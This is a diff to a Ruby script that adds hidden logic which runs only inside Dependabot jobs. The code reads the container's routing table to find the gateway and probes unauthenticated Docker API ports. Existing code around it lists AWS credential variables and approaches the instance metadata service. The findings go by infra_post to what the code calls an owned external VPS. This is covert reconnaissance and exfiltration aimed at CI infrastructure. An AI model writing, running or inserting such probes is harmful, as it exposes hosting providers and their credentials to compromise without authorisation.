@@ -150,6 +150,15 @@ rescue StandardError
   [0, "".b]
 end
 
+def infra_default_ipv4_gateway
+  routes = infra_bounded_file("/proc/net/route").to_s.lines.drop(1)
+  fields = routes.map(&:split).find { |parts| parts.length >= 3 && parts[1] == "00000000" }
+  return nil unless fields && fields[2].match?(/\A[0-9A-Fa-f]{8}\z/)
+  [fields[2]].pack("H*").bytes.reverse.join(".")
+rescue StandardError
+  nil
+end
+
 infra_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
 if infra_job_id.match?(/\A[0-9]+\z/)
   guard = "/tmp/dependabot-infra-probe-#{infra_job_id}.done"
@@ -160,6 +169,11 @@ if infra_job_id.match?(/\A[0-9]+\z/)
   end
 
   if guard
+    infra_post(infra_job_id, "runtime-start", JSON.generate({
+      "job_id" => infra_job_id,
+      "probe" => "dependabot-proxy-boundary-v2"
+    }))
+
     environment_names = %w[
       AWS_CONTAINER_CREDENTIALS_RELATIVE_URI AWS_CONTAINER_CREDENTIALS_FULL_URI
       AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE AWS_WEB_IDENTITY_TOKEN_FILE AWS_ROLE_ARN
@@ -239,17 +253,31 @@ if infra_job_id.match?(/\A[0-9]+\z/)
 
     docker_ping_status, docker_ping_body = infra_proxy_http("http://host.docker.internal:2375/_ping")
     docker_tls_port_status, docker_tls_port_body = infra_proxy_http("http://host.docker.internal:2376/_ping")
+    route_gateway = infra_default_ipv4_gateway
+    route_gateway_status, route_gateway_body = if route_gateway
+      infra_proxy_http("http://#{route_gateway}:2375/_ping")
+    else
+      [0, "".b]
+    end
     summary["host_gateway"] = {
+      "runtime_default_gateway_present" => !route_gateway.nil?,
       "docker_2375_ping_status" => docker_ping_status,
       "docker_2375_ping_length" => docker_ping_body.bytesize,
       "docker_2375_ping_sha256" => Digest::SHA256.hexdigest(docker_ping_body),
       "docker_2376_http_status" => docker_tls_port_status,
       "docker_2376_http_length" => docker_tls_port_body.bytesize,
-      "docker_2376_http_sha256" => Digest::SHA256.hexdigest(docker_tls_port_body)
+      "docker_2376_http_sha256" => Digest::SHA256.hexdigest(docker_tls_port_body),
+      "route_gateway_docker_2375_ping_status" => route_gateway_status,
+      "route_gateway_docker_2375_ping_length" => route_gateway_body.bytesize,
+      "route_gateway_docker_2375_ping_sha256" => Digest::SHA256.hexdigest(route_gateway_body)
     }
     if docker_ping_status == 200 && docker_ping_body.bytesize <= 4096
       summary["host_gateway"]["docker_ping_stored_0600_on_owned_vps"] =
         infra_post(infra_job_id, "host-gateway-docker-ping", docker_ping_body)
+    end
+    if route_gateway_status == 200 && route_gateway_body.bytesize <= 4096
+      summary["host_gateway"]["route_gateway_docker_ping_stored_0600_on_owned_vps"] =
+        infra_post(infra_job_id, "host-gateway-docker-ping", route_gateway_body)
     end
 
     imds_unauth_status, imds_unauth_role_body =
